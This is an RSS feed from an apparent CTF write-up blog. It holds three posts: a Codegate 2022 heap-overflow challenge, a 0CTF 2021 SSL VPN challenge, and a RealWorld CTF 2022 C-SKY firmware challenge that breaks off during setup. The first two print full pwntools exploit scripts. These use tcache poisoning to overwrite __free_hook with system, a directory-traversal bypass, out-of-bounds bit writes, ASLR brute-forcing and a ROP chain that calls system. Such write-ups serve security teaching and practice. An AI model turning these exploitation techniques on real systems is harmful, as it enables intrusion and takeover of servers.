<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>writeups Archives - Hopeless blog</title>
	<atom:link href="https://pwnblog.github.io/category/writeups/feed/" rel="self" type="application/rss+xml" />
	<link>https://pwnblog.github.io/category/writeups/</link>
	<description>Pwn the life</description>
	<lastBuildDate>Mon, 28 Feb 2022 03:10:26 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=6.0.3</generator>
	<item>
		<title>Codegate CTF 2022 file-v writeup</title>
		<link>https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/</link>
		
		<dc:creator><![CDATA[rookie]]></dc:creator>
		<pubDate>Mon, 28 Feb 2022 03:10:23 +0000</pubDate>
				<category><![CDATA[writeups]]></category>
		<guid isPermaLink="false">https://pwnblog.github.io/?p=101</guid>

					<description><![CDATA[<p>codegate ctf 2022 file-v writeup</p>
<p>The post <a rel="nofollow" href="https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/">Codegate CTF 2022 file-v writeup</a> appeared first on <a rel="nofollow" href="https://pwnblog.github.io">Hopeless blog</a>.</p>
]]></description>
										<content:encoded><![CDATA[
<h2 id="0x1-filesystem">0x1 Filesystem?</h2>



<p>The reason I chose this challenge is because nobody is focusing this challenge in my team, so I took a glance at it.</p>



<p>This program consists 2 parts, first is main process which handle all our input, and a backend process(child) that handles all data passed by main process.</p>



<p>These two process communicate with a socket pair.</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-c" data-lang="C"><code>void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int fd[2]; // [rsp+0h] [rbp-18h] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-10h]

  v4 = __readfsqword(0x28u);
  *(_QWORD *)fd = -1LL;
  banner();
  initial();
  if ( socketpair(1, 1, 0, fd) &gt;= 0 )
  {
    if ( fork() )
      interface(fd[1]);
    backend(fd[0]);
  }
  perror(&quot;socketpair&quot;);
  exit(-1);
}</code></pre></div>



<p>The frontend process has following functions:</p>



<ul><li>Create new file</li><li>Print files</li><li>Select file (perform some operations on specific file)<ul><li>Edit file name</li><li>Edit file color</li><li>Show file content</li><li>Edit file content</li><li>Save file changes</li><li>Remove file</li></ul></li></ul>



<p>The backend process is simpler, accept specific operations from frontend process and store in memory:</p>



<ul><li>Print files</li><li>Create new file</li><li>Select file ( actually just return a plain file structure)</li><li>Edit file ( actually just store file structure from frontend process)</li><li>Delete file</li></ul>



<h2 id="0x2-bug">0x2 Bug?</h2>



<p>At first I thought there&#8217;s a race condition bug because there&#8217;s a fork call, otherwise It doesn&#8217;t need to fork a new process.</p>



<p>But let&#8217;s take a closer look at edit function in frontend.</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-c" data-lang="C"><code>    __printf_chk(1LL, &quot;Enter content: &quot;);
    v5 = gets(new_len);
    v6 = ptr-&gt;total_bytes;
    v7 = v5;
    v8 = (file *)malloc(ptr-&gt;total_bytes - ptr-&gt;content_len + new_len);
    memcpy(v8, ptr, v6);
    v8-&gt;edit_time = time(0LL);
    v9 = v8-&gt;filename_len;
    v8-&gt;content_len = new_len;
    memcpy(&v8-&gt;content[v9 + 1], v7, new_len);
    free(ptr);
    free(v7);</code></pre></div>



<p><strong>The total_bytes isn&#8217;t updated!</strong></p>



<p>How do we update this field? Let&#8217;s check edit name function.</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-c" data-lang="C"><code>    __printf_chk(1LL, &quot;Enter filename: &quot;);
    v5 = gets(v4);
    v6 = strlen(v5);
    v7 = ptr-&gt;content_len + v6 + 0x19;
    v8 = (file *)calloc(v7, 1uLL);
    v8-&gt;total_bytes = v7;
    v8-&gt;create_time = ptr-&gt;create_time;
    v9 = time(0LL);
    LODWORD(v7) = ptr-&gt;content_len;
    v8-&gt;edit_time = v9;
    v10 = ptr-&gt;color;
    v8-&gt;filename_len = v6;
    v8-&gt;content_len = v7;
    v8-&gt;color = v10;
    memcpy(v8-&gt;content, v5, v6);
    memcpy(&v8-&gt;content[v6 + 1], &ptr-&gt;content[ptr-&gt;filename_len + 1], (unsigned int)v7);
    free(ptr);
    free(v5);</code></pre></div>



<p><strong>total_bytes is actually updated in edit name!</strong></p>



<p>What if, we first edit content like 0x100 bytes, edit name(update total_bytes) and second time we edit this content 0x20 bytes?</p>



<p>memcpy<em>(v8, ptr, v6);</em> v6 is actually old total_bytes, which means we will overflow v8!</p>



<h2 id="0x3-how-to-leak">0x3 How to leak?</h2>



<p>Seems there&#8217;s only a oob write bug in edit, and likely it will cause heap crash, so how to leak?</p>



<p>Let&#8217;s checksec first:</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>[+] checksec for &#39;/home/rookie/funnypwn/codegate/2022/filev/file-v&#39;
Canary                        : ✓ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✓ 
RelRO                         : Full</code></pre></div>



<p>Everything is on, hmmm.</p>



<figure class="wp-block-image"><img src="https://i.pinimg.com/originals/61/35/d0/6135d06c45b9f6cbd1b961d68c873664.jpg" alt="Meme Challenge Accepted wallpaper | Challenge accepted, Book challenge,  Challenges"/></figure>



<h2 id="0x4-save-to-rescue">0x4 Save to rescue</h2>



<p>What if , we don&#8217;t update total_bytes?</p>



<p>After we updating content_len in edit content, how about save the file struct directly without editing name?</p>



<p>Let&#8217;s check frontend save function:</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-c" data-lang="C"><code> bufa[0] = 0x401012703LL;
  if ( send(fd, bufa, 8uLL, 0) &lt; 0 || send(fd, &n, 4uLL, 0) &lt; 0 || send(fd, filename, n, 0) &lt; 0 )
    goto LABEL_13;
  if ( (int)recv(fd, &v7, 4uLL, 0) &lt; 0 )
    goto LABEL_14;
  if ( v7 == 0xC00000BB )
    goto LABEL_10;
  if ( send(fd, a4, 4uLL, 0) &lt; 0 || send(fd, a4, (unsigned int)a4-&gt;total_bytes, 0) &lt; 0 )
  {
LABEL_13:
    perror(&quot;send&quot;);
    exit(-1);
  }</code></pre></div>



<p>As you can see, the saved bytes is actually determined by total_bytes!</p>



<p>If we make content_len larger than total_bytes, we can leak heap data by show content!</p>



<script id="asciicast-ZxOKuyjOW4SIpDrMIg4xsWO5U" src="https://asciinema.org/a/ZxOKuyjOW4SIpDrMIg4xsWO5U.js" async></script>



<h2 id="0x5-exploit">0x5 Exploit</h2>



<p>The exploit is very straightforward, just abusing tcache link list, we can write free_hook to system and get shell.</p>



<p>My exploit is a bit complex because I forgot libc 2.27 doesn&#8217;t check tcache chunk size, my first thought is writing one gadget to malloc_hook, but I didn&#8217;t found a useable one gadget. After some frustration I suddenly remembered libc 2.27 doesn&#8217;t check size metadata which means we can write anywhere!</p>



<p>Here is my full exploit code:</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-python" data-lang="Python"><code>from pwn import *

debug = 0
# socat -d -d TCP-LISTEN:5555,reuseaddr,fork EXEC:&quot;env LD_PRELOAD=./libc-2.27.so ./file-v&quot;
if debug:
    os.system(&#39;pkill -9 file-v&#39;)
    p = remote(&#39;127.0.0.1&#39;, 5555)
    with open(&#39;/tmp/test.gdb&#39;, &#39;w&#39;) as f:
        f.write(&#39;b *0x555555556AEA&#39;)
    # run_in_new_terminal(&quot;gdb attach $(ps -C file-v -o pid|sed -n &#39;2p&#39;) -x /tmp/test.gdb&quot;)  # attach child
    # e = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;)
    e = ELF(&#39;filev/libc-2.27.so&#39;)
else:
    p = remote(&#39;3.36.184.9&#39;, 5555)
    e = ELF(&#39;filev/libc-2.27.so&#39;)


def show_drive():
    p.sendlineafter(&#39;&gt; &#39;, &#39;a&#39;)
    p.recvuntil(&#39;The number of files: &#39;)
    count = int(p.recvuntil(&#39;\n&#39;))
    files = []
    if count:
        for i in range(count):
            p.recvuntil(f&#39;[{i}]:&#39;)
            p.recvuntil(&#39; &#39;)
            files.append(p.recvuntil(&#39;\x1B&#39;, drop=1))
    return files


def create(fn, l=None):
    if not l:
        l = len(fn)
    p.sendlineafter(&#39;&gt; &#39;, &#39;c&#39;)
    p.sendlineafter(&#39;:&#39;, str(l))
    p.sendlineafter(&#39;:&#39;, fn)


def select(fn):
    p.sendlineafter(&#39;&gt; &#39;, &#39;b&#39;)
    p.sendlineafter(&#39;:&#39;, fn)


def edit_name(fn, l=None):
    if not l:
        l = len(fn)
    p.sendlineafter(&#39;&gt; &#39;, &#39;1&#39;)
    p.sendlineafter(&#39;:&#39;, str(l))
    p.sendafter(&#39;:&#39;, fn)


def show():
    p.sendlineafter(&#39;&gt; &#39;, &#39;3&#39;)
    content = bytearray()
    while True:
        data = p.recvline_regex(r&#39;^\d+\s\|.+?\|&#39;, timeout=0.5)
        if data:
            for m in re.finditer(rb&#39;^\d+\s\|(.+?)\|&#39;, data, re.MULTILINE):
                for hexbyte in m.group(1).strip().split(b&#39; &#39;):
                    if hexbyte:
                        content += bytearray([int(hexbyte.decode(), 16)])
        else:
            return content


def edit(c, l=None):
    if not l:
        l = len(c)
    p.sendlineafter(&#39;&gt; &#39;, &#39;4&#39;)
    p.sendlineafter(&#39;:&#39;, str(l))
    p.sendafter(&#39;:&#39;, c)


def save():
    p.sendlineafter(&#39;&gt; &#39;, &#39;5&#39;)


def rm():
    p.sendlineafter(&#39;&gt; &#39;, &#39;d&#39;)


def back():
    p.sendlineafter(&#39;&gt; &#39;, &#39;b&#39;)


create(&#39;rookie&#39;)
create(&#39;fuck&#39;)
select(&#39;rookie&#39;)
edit(&#39;a&#39; * 0x90)
save()
back()
select(&#39;rookie&#39;)
data = show()
heap = u64(data[0x19:0x21])
libc = u64(data[0x79:0x81])
e.address = libc - e.symbols[&#39;_IO_2_1_stderr_&#39;]
log.success(f&#39;heap: 0x{heap:x} libc: 0x{e.address:x}&#39;)
back()
select(&#39;fuck&#39;)

edit(&#39;a&#39; * (0x88 - 0x1d))
edit_name(&#39;f&#39; * 0x67)
edit_name(&#39;fuck&#39;)
edit(b&#39;x&#39; * 0x69 + p64(0x71) + p64(e.symbols[&#39;__free_hook&#39;] - 0x13))
edit_name(&#39;fuck&#39;)
edit(b&#39;b&#39; * 0x49 + p64(0x101) + b&#39;b&#39; * 0x18)
edit_name(&#39;fuck&#39;)
edit(&#39;c&#39; * 0x49)
payload = b&#39;/bin/sh\x00&#39; + b&#39;b&#39; * 0xb + p64(e.symbols[&#39;system&#39;])
payload = payload.ljust(0x67)
edit(payload)
p.interactive()
</code></pre></div>



<p></p>
<p>The post <a rel="nofollow" href="https://pwnblog.github.io/2022/02/28/codegate-ctf-2022-file-v-writeup/">Codegate CTF 2022 file-v writeup</a> appeared first on <a rel="nofollow" href="https://pwnblog.github.io">Hopeless blog</a>.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>0CTF 2021 Quals &#8220;ioa&#8221; writeup</title>
		<link>https://pwnblog.github.io/2022/02/15/0ctf-2021-quals-ioa-writeup/</link>
		
		<dc:creator><![CDATA[rookie]]></dc:creator>
		<pubDate>Tue, 15 Feb 2022 14:24:11 +0000</pubDate>
				<category><![CDATA[writeups]]></category>
		<guid isPermaLink="false">https://pwnblog.github.io/?p=80</guid>

					<description><![CDATA[<p>sslvpn ioa writeup for 0ctf 2021 quals.</p>
<p>The post <a rel="nofollow" href="https://pwnblog.github.io/2022/02/15/0ctf-2021-quals-ioa-writeup/">0CTF 2021 Quals &#8220;ioa&#8221; writeup</a> appeared first on <a rel="nofollow" href="https://pwnblog.github.io">Hopeless blog</a>.</p>
]]></description>
										<content:encoded><![CDATA[
<h2 id="0x1-directory-traversal">0x1 Directory traversal</h2>



<p>We were given a simple ssl vpn server and we need to pwn it somehow. Good thing is this binary has symbols intact, a little bit easier for reversing.</p>



<p>Basically, this ssl vpn server requires you to login in order to connect to intranet or do something funny, so we need to somehow leak username and password from target server.</p>



<p>What&#8217;s your best bet on leaking files from a https server? Yes, directory traversal!</p>



<p>Since our password file located in ../user.txt, we can try to access it directly:</p>



<script id="asciicast-qJxd1lIz753Jo1wvZAvVkXsgm" src="https://asciinema.org/a/qJxd1lIz753Jo1wvZAvVkXsgm.js" async=""></script>



<p><em>Tips: use %2e%2e to bypass restrictions.</em></p>



<h2 id="0x2-oob-r-w">0x2 OOB R/W</h2>



<p>Now we&#8217;ve got username and password, time to pwn sslvpn server!</p>



<p>The simple oob bug is in function <strong>is_vip_inuse</strong> ,<strong>set_vip_bitmap</strong> and <strong>clear_vip_bitmap</strong>.</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-c" data-lang="C"><code>int *__fastcall set_vip_bitmap(int a1)
{
  int *result; // rax
  int v2; // [rsp+8h] [rbp-Ch]

  v2 = a1 - (dhcp_pool.vip.ipaddr & dhcp_pool.vip.mask);
  result = (int *)(unsigned int)dhcp_pool.total_bits;
  if ( v2 &gt;= dhcp_pool.total_bits )
    return result;
  result = &dhcp_pool.bits[(int)((unsigned __int64)v2 &gt;&gt; 5)];
  *result &= ~(1 &lt;&lt; (v2 & 0x1F)); // oob write 0
  return result;
}

int *__fastcall clear_vip_bitmap(int a1)
{
  int *result; // rax
  int v2; // [rsp+8h] [rbp-Ch]

  v2 = a1 - (dhcp_pool.vip.ipaddr & dhcp_pool.vip.mask);
  result = (int *)(unsigned int)dhcp_pool.total_bits;
  if ( v2 &gt;= dhcp_pool.total_bits )
    return result;
  result = &dhcp_pool.bits[(int)((unsigned __int64)v2 &gt;&gt; 5)];
  *result |= 1 &lt;&lt; (v2 & 0x1F); // oob write 1
  return result;
}

unsigned int __fastcall is_vip_inuse(int a1)
{
  unsigned int result; // eax
  int v2; // [rsp+8h] [rbp-Ch]

  v2 = a1 - (dhcp_pool.vip.ipaddr & dhcp_pool.vip.mask);
  if ( v2 &gt;= dhcp_pool.total_bits )
    result = -1;
  else
    result = (dhcp_pool.bits[(int)((unsigned __int64)v2 &gt;&gt; 5)] & (1 &lt;&lt; (v2 & 0x1F))) == 0; // oob read here
  return result;
}</code></pre></div>



<p>These functions take 1 argument that we can control, read/write bits based on argument 1 after a check. The simple total bits check is bypassable if we send number lower than <em>dhcp_pool.vip.ipaddr &amp; dhcp_pool.vip.mask</em>, resulting oob read/write memory bits before <em>dhcp_pool.bit</em>s.</p>



<p><em>dhcp_pool.vip.ipaddr &amp; dhcp_pool.vip.mask</em> is actually a static number, represents binary format of subnet 172.31.0.0/16.</p>



<h2 id="0x3-leak">0x3 Leak?</h2>



<p>Since the whole binary is PIE, we need to somehow leak some address from server to build exploit.</p>



<p>Let&#8217;s inspect if there&#8217;re any interesting pointer before <em>dhcp_pool.bits</em>.</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="1024" height="353" src="https://pwnblog.github.io/wp-content/uploads/2022/02/image-2-1024x353.png" alt="" class="wp-image-91" srcset="https://pwnblog.github.io/wp-content/uploads/2022/02/image-2-1024x353.png 1024w, https://pwnblog.github.io/wp-content/uploads/2022/02/image-2-300x103.png 300w, https://pwnblog.github.io/wp-content/uploads/2022/02/image-2-768x265.png 768w, https://pwnblog.github.io/wp-content/uploads/2022/02/image-2.png 1059w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>



<p>Nice, we can leak heap address by reading backwards!</p>



<p>However, I didn&#8217;t find anything related to base address of .text in heap, how to leak base address?</p>



<p><strong>Just bruteforce!</strong></p>



<p>Yes, you heard it right, we can just bruteforce the ASLR! Because actual process handling our packets are <strong>forked</strong> from original process, ASLR doesn&#8217;t change at all! Just keep scanning backward, sooner or later you&#8217;ll landed at .text segment!</p>



<p><em>The gap between our bits data and actual heap leak isn&#8217;t working in actual remote server during CTF, I had to dump all heap data to inspect correct gap.:( </em></p>



<h2 id="0x4-stack-overflow-show-time">0x4 Stack overflow show time</h2>



<p>Since we now have program base address, we can overwrite anything in data/bss. You may wanna overwrite <em>dhcp_pool.bits</em>, but keep in mind that we can only write 1 bit per packet, which obviously will crash program next packet if we overwrite <em>dhcp_pool.bits</em>.</p>



<p>Let&#8217;s look at code snip at req_vip.</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-c" data-lang="C"><code>    v4 = 8 * (LOWORD(dhcp_pool.cnt) + 2);    
    v24 = 0xDEADBEEF; // stack variable v24
    v25 = htons(v4);
    v26 = 1;
    v27 = htonl(hostlonga);
    v28 = htonl(dhcp_pool.vip.mask);
    for ( k = 0; k &lt; dhcp_pool.cnt; ++k )
    {
      *(&v24 + 2 * k + 4) = htonl(dhcp_pool.items[k]-&gt;ipaddr); // write something to stack
      *(&v24 + 2 * k + 5) = htonl(dhcp_pool.items[k]-&gt;mask);
    }
    buffer_push(&a1-&gt;sendbuf, &v24, v4);</code></pre></div>



<p>If we overwrite <em>dhcp_pool.cnt</em>, we can force req_vip to write out of bounds which leads to stack overflow!</p>



<p>So we must leak canary somehow.</p>



<p>Look at code above another time, did you noticed that type of loop variable k is int? If we modify <em>dhcp_pool.cnt</em> to some negative value while keeping v4 positive and larger, we won&#8217;t enter for loop but we can receive large amount of stack data!</p>



<h2 id="0x5-exploit">0x5 Exploit!</h2>



<p>After leaking canary from stack, everything is ready, so just rop to system and execute getflag bin!</p>



<p>By redirecting getflag output to a text file, we can read flag via https service!</p>



<p>Full exploit:</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-python" data-lang="Python"><code>from pwn import *

debug = 1

context.arch = &#39;amd64&#39;


# gdbserver --attach 0.0.0.0:2222 $(ps -C sslvpnd -o pid |tail -n 1)
# docker exec -it ioa /bin/bash -c &quot;gdbserver --attach 0.0.0.0:2222 \$(ps -C sslvpnd -o pid |tail -n 1)&quot;

def login(level=&#39;error&#39;) -&gt; remote:
    if debug:
        p = remote(&#39;127.0.0.1&#39;, 443, ssl=True, level=level)
    else:
        p = remote(&#39;111.186.58.249&#39;, 36717, ssl=True, level=level)
    data = &#39;name=rea1user&passwd=re4lp4ssw0rd&#39;
    packet = f&#39;&#39;&#39;POST /login HTTP/1.1
Content-Length: {len(data)}

{data}&#39;&#39;&#39;.replace(&#39;\n&#39;, &#39;\r\n&#39;)
    p.send(packet)
    p.recvuntil(&#39;success&#39;)
    return p


def packet_wrap(func):
    def inner(*args, **kwargs):
        _ = func(*args, **kwargs)
        return p32(0xdeadbeef) + p16(len(_) + 6, endian=&#39;big&#39;) + _

    return inner


@packet_wrap
def check_vip_packet(val):
    return p16(3) + p32(val, endian=&#39;big&#39;)


@packet_wrap
def req_vip_packet(val):
    return p16(1) + p32(val, endian=&#39;big&#39;)


@packet_wrap
def kick_out_packet(val, key):
    return p16(4) + p32(val, endian=&#39;big&#39;) + key


def check_vip(p, val, pack_only=False):
    packet = check_vip_packet(val)
    if not pack_only:
        p.send(packet)
        buf = p.recvn(0xC)
        return u32(buf[-4:])
    else:
        return packet


def req_vip(p, val, pack_only=False):
    packet = req_vip_packet(val)
    if not pack_only:
        p.send(packet)
        buf = p.recvn(4)
        buf = p.recvn(2)
        sz = u16(buf, endian=&#39;big&#39;)
        buf = p.recvn(sz - 6)

        return buf
    else:
        return packet


def ip2long(ip):
    &quot;&quot;&quot;
    Convert an IP string to long
    &quot;&quot;&quot;
    return struct.unpack(&quot;!L&quot;, socket.inet_aton(ip))[0]


def leak(p, off, sz=8):
    data = []
    off &lt;&lt;= 3
    packets = b&#39;&#39;
    for i in range(0, sz):
        # out = 0
        for j in range(8):
            packets += check_vip_packet(base - i * 8 - j - 1 - off)

    p.send(packets)
    for i in range(0, sz):
        out = 0
        for j in range(8):
            buf = p.recvn(0xC)
            r = u32(buf[-4:])
            out &lt;&lt;= 1
            out |= r ^ 1
        data.append(out)
    return bytearray(data)

def kickout(p, val):
    global mkey
    p.send(kick_out_packet(val, mkey))
    buf = p.recvn(0xC)
    return u32(buf[-4:])


def offset(p):
    return (heap - p) &lt;&lt; 3

def write_buf(addr, buf, old=None):
    if old is None:
        old = bytes(len(buf))

    for i in range(len(buf)):
        for j in range(8):
            a = (buf[i] &gt;&gt; j) & 1
            b = (old[i] &gt;&gt; j) & 1
            o = base - offset(addr) + (i * 8 + j)
            if a != b:
                if a == 1:
                    kickout(m, o)
                else:
                    t = login(&#39;debug&#39;)
                    req_vip(t, o)
                    t.close()


m = login()
base = ip2long(&#39;172.31.0.0&#39;)
crash_first = True
if crash_first:
    try:
        check_vip(m, base - 0xffffff)  # force restart
    except:
        m.close()

    m = login()

e = ELF(&#39;./sslvpnd&#39;)

if debug:
    heap_param = 15
    heap = 0
    cb = 0 # program base address
else:
    heap_param = 33 # fuck remote heap layout
    heap = 0
    cb = 0
if not heap:
    # for x in range(0x100):
    data = leak(m, heap_param * 16, 8)
    heap = u64(data[:8], endian=&#39;big&#39;) + 0xc0 + (heap_param - 15) * 0x10

log.success(f&#39;heap: 0x{heap:x}&#39;)

if not cb:
    heap_off = heap & 0xffff
    t = 3
    pro = log.progress(&#39;Leaking base...&#39;)
    while True:
        try:
            t += 1
            tmp = login()
            pro.status(f&#39;Try {t}...&#39;)
            off = heap_off + 0x10000 * t
            off &lt;&lt;= 3
            check_vip(tmp, base - off)
            pro.success(f&#39;Try {t}...success&#39;)
            cb = heap - heap_off - 0x10000 * t
            break
        except KeyboardInterrupt:
            sys.exit(0)
        except:
            pro.status(f&#39;Try {t}...Fail&#39;)
        finally:
            tmp.close()

    pro = log.progress(&#39;Leaking accurate base...&#39;)
    heap_off = heap - cb
    t = 0
    while True:
        try:
            tmp = login()
            pro.status(f&#39;Try {t}...&#39;)
            off = heap_off + 0x1000 * t
            t += 1
            off &lt;&lt;= 3
            check_vip(tmp, base - off)
            pro.status(f&#39;Try {t}...Fail&#39;)
        except KeyboardInterrupt:
            sys.exit(0)
        except:
            pro.success(f&#39;Try {t}...success&#39;)
            cb = heap - heap_off - 0x1000 * t
            break
        finally:
            tmp.close()
    cb += 0x2000
    log.success(f&#39;base: 0x{cb:x}&#39;)


def _(rop_bytes: bytes):
    total = len(rop_bytes)
    _ = b&#39;&#39;
    for i in range(0, total, 4):
        _ += rop_bytes[i:i + 4][::-1]
    return _


e.address = cb

master_key = e.symbols[&#39;master_key&#39;]
dhcp_pool = e.symbols[&#39;dhcp_pool&#39;]
total_bits = dhcp_pool + 0x14
cnt = dhcp_pool + 0x18
heap_off = heap & 0xfff

# w = login()
# pprint(leak(w, heap - cb - 8))
mkey = leak(m, heap - master_key - 8)[::-1]
log.success(f&#39;mkey : {mkey}&#39;)
off = offset(total_bits + 4)
for x in range(32):
    kickout(m, base - off - 2 - x)

log.success(&#39;set 0x7ffffff done.&#39;)
# overwrite count
for i in [5, 31]:
    kickout(m, base - offset(cnt) + i)
t = login()
canary = u64(req_vip(t, base + 3)[0x92:0x9a])
log.success(f&#39;canary 0x{canary:x}&#39;)
t.close()
items = u64(leak(m, heap - dhcp_pool - 0x28)[::-1])
log.success(f&#39;items 0x{items:x}&#39;)
r = ROP(e, base=dhcp_pool + 0x200)
r.raw(canary)
r.raw(0)
r.raw(0)
r.raw(0)
r.raw(r.ret.address)
r.system(&quot;./getflag &gt;q.txt&quot;)
final_rop = _(r.chain())

write_buf(dhcp_pool + 0x200, final_rop)
write_buf(dhcp_pool + 0x28,
          p64(items) * 0x10 +
          b&#39;&#39;.join([p64(dhcp_pool + 0x200 + i) for i in range(0, len(final_rop), 8)]) +
          p64(items) * 0x20)

write_buf(cnt, p32(0x21), p32(0x80000021))  # this will crash after system

m.interactive()</code></pre></div>



<p></p>
<p>The post <a rel="nofollow" href="https://pwnblog.github.io/2022/02/15/0ctf-2021-quals-ioa-writeup/">0CTF 2021 Quals &#8220;ioa&#8221; writeup</a> appeared first on <a rel="nofollow" href="https://pwnblog.github.io">Hopeless blog</a>.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Realworld CTF 2022 &#8220;The rise of sky&#8221; writeup</title>
		<link>https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/</link>
		
		<dc:creator><![CDATA[rookie]]></dc:creator>
		<pubDate>Wed, 09 Feb 2022 15:27:15 +0000</pubDate>
				<category><![CDATA[writeups]]></category>
		<guid isPermaLink="false">https://pwnblog.github.io/?p=30</guid>

					<description><![CDATA[<p>Interesting challenge with CSKY cpu and weird arch mcore in RWCTF 2022</p>
<p>The post <a rel="nofollow" href="https://pwnblog.github.io/2022/02/09/realworld-ctf-the-rise-of-sky-writeup/">Realworld CTF 2022 &#8220;The rise of sky&#8221; writeup</a> appeared first on <a rel="nofollow" href="https://pwnblog.github.io">Hopeless blog</a>.</p>
]]></description>
										<content:encoded><![CDATA[
<h2 id="0x1-challenge-accepted">0x1 Challenge accepted</h2>



<p>We&#8217;re given a small compressed file, the first thing to do is throw it in binwalk :).</p>



<script id="asciicast-XUTc1rW9IWiaNgaHusECGU96z" src="https://asciinema.org/a/XUTc1rW9IWiaNgaHusECGU96z.js" async="" data-rows="20" data-cols="100"></script>



<p>Looks like a iot system image packed with CramFS, we gotta install some cramfs tools in order to unpack this file. </p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-bash" data-lang="Bash"><code>apt install cramfsprogs</code></pre></div>



<p><em>spoiler: binwalk -e <strong>sucks</strong></em>, <em>although it can unpack this image, you won&#8217;t get all files inside it, binwalk stops nowhere and idk why.</em></p>



<script id="asciicast-2y43V2hCdi2PoX6qAKfWWalFt" src="https://asciinema.org/a/2y43V2hCdi2PoX6qAKfWWalFt.js" async=""></script>



<p>OK, you may wonder why we need sudo to extract the image? Simply because image contains some symbol link to /proc/self/mem or other root stuff that we have to sudo to extract. </p>



<p>Well you don&#8217;t see anything interesting besides a demo.mjpeg and a fake flag file, <strong>where is the target binary</strong>?</p>



<h2 id="0x2-enemy-spotted">0x2 Enemy spotted</h2>



<p>Target server is actually at <strong>/usr/bin/server</strong>! </p>



<p>Let&#8217;s pull that out and fire up IDA! Oh&#8230; wait..</p>



<figure class="wp-block-image size-full"><img loading="lazy" width="670" height="156" src="https://pwnblog.github.io/wp-content/uploads/2022/02/image.png" alt="" class="wp-image-51" srcset="https://pwnblog.github.io/wp-content/uploads/2022/02/image.png 670w, https://pwnblog.github.io/wp-content/uploads/2022/02/image-300x70.png 300w" sizes="(max-width: 670px) 100vw, 670px" /></figure>



<p>WTF is mcore? I never heard that before, after some some google fu, I found something in <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/M%C2%B7CORE" target="_blank">wikipedia</a>.</p>



<p>Looks like only c-sky cpu can fully support this weird thing, so wtf is c-sky cpu?</p>



<p>C-SKY cpu arch actually has a somewhat nice <a rel="noreferrer noopener" href="https://c-sky.github.io/" target="_blank">github page here</a>. you can check more information in there website but the most important part is they have a buildroot for this arch!</p>



<p><a rel="noreferrer noopener" href="https://github.com/c-sky/buildroot/releases" target="_blank">In this github release page</a> you&#8217;ll find some buildroot releases, I choose &#8220;c810/807 linux-5.10&#8221; one.</p>



<p>Download and unpack everything from gitlab artifacts, and ?</p>



<p><strong>READ THE FUCKING README.TXT FIRST</strong></p>



<p>well there&#8217;s a readme_advanced.txt, I highly suggest you read that file too.</p>



<h2 id="0x3-testing-server">0x3 Testing server</h2>



<p>Since our lovely ida refuses to load this binary just like every girl I like refuses me, I decided to just run this binary first and see how it goes.</p>



<p>In readme_advanced.txt, we actually can run this custom qemu image with network support which is very import for debugging.</p>



<p>Everything we need is in the unpacked folder we downloaded in step 2, including gdb/gdbserver/qemu.</p>



<p>Copy gdbserver , our target server and demo.mpeg into new qemu machine:</p>



<script id="asciicast-asFrrLX03XDwpnQqHnrpX8Qhb" src="https://asciinema.org/a/asFrrLX03XDwpnQqHnrpX8Qhb.js" async="" data-speed="2"></script>



<p>Fire up qemu with network support:</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-bash" data-lang="Bash"><code>./host/csky-qemu/bin/qemu-system-cskyv2 -M virt -cpu c810v -kernel Image -nographic -append &quot;console=ttyS0,115200 rdinit=/sbin/init rootwait root=/dev/vda ro&quot; -drive file=rootfs.ext2,format=raw,id=hd0 -device virtio-blk-device,drive=hd0 -netdev tap,script=no,id=net0 -device virtio-net-device,netdev=net0</code></pre></div>



<p>Setting correct ip address in <strong>host</strong>:</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-bash" data-lang="Bash"><code>sudo ifconfig tap0 192.168.101.200</code></pre></div>



<p>Setting correct ip address in <strong>qemu guest</strong>:</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code>ifconfig eth0 192.168.101.23</code></pre></div>



<p><em>Technically you can set whatever ip address you want but I&#8217;ll go with this for now.</em></p>



<p>But wait, how to run the server? Let&#8217;s go back to challenge image folder and grep the server path, there should be some script that launches the server, we can guess correct parameters there.</p>



<script id="asciicast-wWQ7GoYGHDrW5QWwEB8zBozJY" src="https://asciinema.org/a/wWQ7GoYGHDrW5QWwEB8zBozJY.js" async=""></script>



<p>Got it, the correct command line should be:</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-bash" data-lang="Bash"><code>./server demo.mjpeg 800 450</code></pre></div>



<p>The two number should be width and height of the rdsp stream, which is actually width and height of demo.mjpeg.</p>



<p>Let&#8217;s run our server inside qemu and see what happens.</p>



<div class="hcb_wrap"><pre class="prism line-numbers lang-plain"><code># ./server ./demo.mjpeg 800 450 
running RTSP server
</code></pre></div>



